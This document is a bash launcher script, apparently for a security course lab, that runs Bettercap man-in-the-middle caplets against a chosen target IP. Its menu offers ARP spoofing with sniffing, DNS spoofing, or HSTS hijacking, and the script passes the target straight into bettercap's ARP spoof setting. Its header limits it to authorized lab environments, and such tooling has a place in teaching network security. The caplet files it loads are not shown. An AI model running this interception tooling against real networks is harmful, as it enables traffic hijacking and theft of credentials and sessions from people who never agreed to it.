#!/usr/bin/env bash
# bettercap_mitm.sh
# Last Edited by Charles Duoto on November 17, 2026
# Launcher for Bettercap MITM caplets.
# Choose ARP-only, ARP+DNS spoof, or ARP+HSTS hijack.
# Pure bash. Authorized lab environments only.
#
# Usage:
#   sudo ./bettercap_mitm.sh
#   sudo ./bettercap_mitm.sh eth0 192.168.1.10

set -euo pipefail

IFACE="${1:-}"
TARGET="${2:-}"
SCRIPT_DIR="$(dirname "$0")"

if [[ -z "$IFACE" ]]; then
    read -rp "Interface [eth0]: " IFACE
    IFACE="${IFACE:-eth0}"
fi

if [[ -z "$TARGET" ]]; then
    read -rp "Target IP: " TARGET
fi

if [[ -z "$TARGET" ]]; then
    echo "[-] Target IP required."
    exit 1
fi

echo
echo "Select caplet:"
echo "1) ARP spoof + sniff only"
echo "2) ARP spoof + DNS spoof"
echo "3) ARP spoof + HSTS hijack (course version)"
echo "4) ARP spoof + HSTS hijack (custom .corn + alert)"
read -rp "Choice [1]: " CHOICE
CHOICE="${CHOICE:-1}"

case "$CHOICE" in
    1) CAPLET="$SCRIPT_DIR/arp_spoof.cap" ;;
    2) CAPLET="$SCRIPT_DIR/dns_spoof.cap" ;;
    3) CAPLET="$SCRIPT_DIR/hstshijack.cap" ;;
    4) CAPLET="$SCRIPT_DIR/hstshijack_custom.cap" ;;
    *) echo "[-] Invalid choice"; exit 1 ;;
esac

if [[ ! -f "$CAPLET" ]]; then
    echo "[-] Caplet not found: $CAPLET"
    exit 1
fi

echo
echo "[*] Interface : $IFACE"
echo "[*] Target    : $TARGET"
echo "[*] Caplet    : $CAPLET"
echo
echo "[*] Starting Bettercap..."
echo "[*] Type 'exit' or Ctrl+C to stop."
echo

bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGET" -caplet "$CAPLET"
